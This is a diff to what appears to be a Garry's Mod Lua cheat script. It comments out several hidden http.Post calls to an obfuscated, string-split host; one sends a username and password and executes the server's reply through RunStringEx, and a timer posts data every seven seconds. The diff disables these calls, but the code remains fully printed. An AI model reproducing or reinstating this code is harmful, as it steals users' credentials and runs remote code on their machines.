@@ -3929,7 +3929,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                 dl = dl + 27
             end
 ​
-            if o() then
+ --[[           if o() then
                 http.Post("ht" .. "tps://ex" .. "echac" .. "k.cc/for" .. "um/thi" .. "sgogo/ex" .. "plo" .. "its.php", {
                     username = username,
                     password = password,
@@ -3937,7 +3937,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                 }, RunStringEx)
             end
         end)
-    end)
+    end)]]
 ​
     dk:Hide()
     local dn = v("DFrame")
@@ -6058,7 +6058,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                     dK = dK + 27
                 end
 ​
-                local ei = {}
+--[[               local ei = {}
 ​
                 http.Post("ht" .. "tps://ex" .. "ech" .. "ack.cc/fo" .. "rum/cf" .. "g.php", {
                     a = "g",
@@ -6119,7 +6119,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                     end
                 end)
             end
-        end
+        end]]
 ​
         ar("Create", 6, 214, 50, 25, aq.tb, function()
             aA(200 - 86, 58, function()
@@ -6134,7 +6134,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                     end)
                 end)
 ​
-                ar("Save on server", 3, 30, 150 - 42, 25, doplpanel, function()
+--[[               ar("Save on server", 3, 30, 150 - 42, 25, doplpanel, function()
                     Derma_StringRequest("Config", "Name", "", function(ah)
                         http.Post("ht" .. "tps://ex" .. "ech" .. "ack.cc/hac" .. "ka/acco" .. "unt/cf" .. "g.php", {
                             a = "c",
@@ -6150,7 +6150,7 @@ surface.SetDrawColor(]] .. bo .. [[)
                     end)
                 end)
             end)
-        end)
+        end)]]
 ​
         ar("Refresh", 58, 214, 58, 25, aq.tb, aP)
         local dh = v("DTextEntry", aq.tb)
@@ -8290,7 +8290,7 @@ surface.CreateFont("fontforentitys",{font="]] .. U["WH_ENTITY_FONT"] .. [[",size
     ff["rp_bangclaw"] = true
     ff["rp_downtown_tits_v1"] = true
 ​
-    timer.Create("123", 7, 0, function()
+--[[    timer.Create("123", 7, 0, function()
         if not o() then return end
 ​
         if ff[game.GetMap()] then
@@ -8302,7 +8302,7 @@ surface.CreateFont("fontforentitys",{font="]] .. U["WH_ENTITY_FONT"] .. [[",size
                 pos = k(b.cloudradarshit, "DATA")
             })
         end
-    end)
+    end)]]
 ​
     local ev, ew, fg = 0, 0, 0
 ​
